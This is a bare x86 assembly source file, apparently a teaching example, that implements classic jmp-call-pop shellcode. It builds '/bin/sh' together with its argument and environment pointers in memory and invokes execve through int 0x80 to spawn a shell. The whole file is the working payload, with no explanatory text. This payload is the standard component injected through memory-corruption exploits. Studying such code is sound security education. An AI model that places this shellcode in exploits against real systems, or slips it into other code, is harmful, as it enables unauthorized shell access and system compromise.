section .text
global _start
_start:
        jmp dir_cadena
        
    codigo:
        pop esi
        mov byte[esi+7], 0
        mov eax, 11
        lea ebx, [esi]
        mov [esi+8], ebx
        lea ecx, [esi+8]
        mov dword [esi+12], 0
        lea edx, [esi+12]
        int 0x80

    dir_cadena:
        call codigo
        db '/bin/shNXXXXYYYY'